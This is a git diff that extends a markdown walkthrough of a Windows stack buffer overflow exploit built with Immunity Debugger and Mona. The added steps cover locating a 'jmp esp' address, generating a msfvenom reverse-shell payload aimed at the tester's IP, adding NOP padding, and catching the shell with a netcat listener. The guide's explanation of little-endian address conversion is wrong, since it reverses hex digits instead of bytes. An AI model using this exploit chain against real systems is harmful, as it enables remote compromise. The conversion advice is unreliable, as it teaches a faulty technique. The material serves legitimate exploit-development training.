@@ -8,11 +8,9 @@
 
 [4. Find the Jump Point](#find-the-jump-point) 
 
-5. Generate the Payload
+[5. Generate the Payload](#generate-the-payload)
 
-6. Add Padding to Allow Shellcode to Unpack
-
-7. Exploit
+[6. Exploit](#exploit)
 
 Set a working directory for Mona from teh Immunity Debugger. Run the following command from the command line in Immunity Debugger
 
@@ -99,3 +97,35 @@ Restart the application and rerun the exploit.py file until Mona returns "Unmodi
 Note: Keep a file of these bad characters, you will need them to find the jump point.
 
 ## Find the Jump Point
+
+While the application is crashed or running run the following Mona command in Immunity Debugger with the list of bad caracters found in the previous steps
+
+<code>!mona jmp -r esp -cpb "\x00\xXX\xXX"</code>
+
+This should bring up a window that will have several addresses to several "jmp esp" memory locations.
+
+Pick an address and update the retn variable in the exploit.py file. 
+
+Note: Keep in mind the architecture of the host. If the host is running in little endian, then the address needs to be written backwards (i.e. if the address is 123456 then the little endian address would be 654321). Convert the address to HEX by adding a "\x" before every two characters (i.e. if the address is 123456 then the HEX version would be \x12\x34\x56). If we are running in little endian then the final address would be "\x65\x43\x21".
+
+## Generate the Payload
+
+Use <code>msfvenom</code> to generate shellcode.
+
+<code>msfvenom -p windows/shell_reverse_tcp LHOST=[YOUR_IP] LPORT=443 EXITFUNC=thread -b "[BAD_CHARACTERS]" -f py</code>
+
+Copy the output to the payload variable in the exploit.py file
+
+Note: The msfvenom command outputs the shellcode under the name buf = "...", make sure to change the name to payload before executing the script.
+
+Add some space to allow the shellcode to unpack by setting the padding variable to:
+
+<code>padding = "\x90" * 16</code> 
+
+## Exploit
+
+Setup a netcat listener 
+
+<code>nc -lnvp 443</code>
+
+Restart the application and run exploit.py, and we should catch a shell.
